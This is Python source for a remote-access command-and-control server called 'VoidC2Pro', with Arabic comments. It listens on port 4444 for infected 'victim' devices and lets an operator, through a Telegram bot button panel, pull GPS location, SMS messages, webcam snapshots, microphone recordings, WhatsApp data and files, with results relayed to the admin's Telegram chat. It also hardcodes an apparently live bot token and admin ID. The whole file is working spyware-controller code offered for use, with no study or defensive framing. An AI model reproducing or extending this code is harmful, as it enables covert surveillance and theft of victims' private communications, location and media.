import socket, threading, telebot, os
from telebot import types

# --- إعدادات النخبة ---
BOT_TOKEN = "8579070794:AAFhYS0DhMAfsA52b44qyf2LC-9jdsa9lD0"
ADMIN_ID = "7918211228"
LHOST = "0.0.0.0"
LPORT = 4444

bot = telebot.TeleBot(BOT_TOKEN)

class VoidC2Pro:
    def __init__(self):
        self.victim = None
        self.addr = None

    def start_listener(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((LHOST, LPORT))
        s.listen(5)
        print(f"[*] البرج في وضع الإنصات على المنفذ {LPORT}...")
        
        while True:
            conn, addr = s.accept()
            self.victim = conn
            self.addr = addr
            self.send_panel(f"🏴‍☠️ تم صيد هدف جديد!\nIP: {addr[0]}")

    def send_panel(self, text):
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [
            types.InlineKeyboardButton("📍 GPS", callback_data="get_location"),
            types.InlineKeyboardButton("📩 SMS", callback_data="dump_sms"),
            types.InlineKeyboardButton("📸 Cam", callback_data="webcam_snap"),
            types.InlineKeyboardButton("🎙️ Mic", callback_data="record_mic"),
            types.InlineKeyboardButton("🟢 WhatsApp", callback_data="dump_whatsapp"),
            types.InlineKeyboardButton("📂 Files", callback_data="ls"),
            types.InlineKeyboardButton("📱 Info", callback_data="get_info")
        ]
        markup.add(*buttons)
        bot.send_message(ADMIN_ID, text, reply_markup=markup)

c2 = VoidC2Pro()

@bot.callback_query_handler(func=lambda call: True)
def handle_clicks(call):
    if c2.victim:
        bot.answer_callback_query(call.id, "جاري إرسال الأمر...")
        try:
            c2.victim.send(call.data.encode())
            # استقبال الاستجابة (بحد أقصى 100 كيلوبايت)
            response = c2.victim.recv(1024 * 100).decode('utf-8', errors='ignore')
            bot.send_message(ADMIN_ID, f"📡 النتيجة من {c2.addr[0]}:\n\n{response}")
        except:
            bot.send_message(ADMIN_ID, "❌ فقدت الاتصال بالهدف!")
    else:
        bot.answer_callback_query(call.id, "❌ لا يوجد هدف متصل!")

if __name__ == "__main__":
    if not os.path.exists("captured_data"): os.makedirs("captured_data")
    threading.Thread(target=c2.start_listener, daemon=True).start()
    bot.polling(none_stop=True)
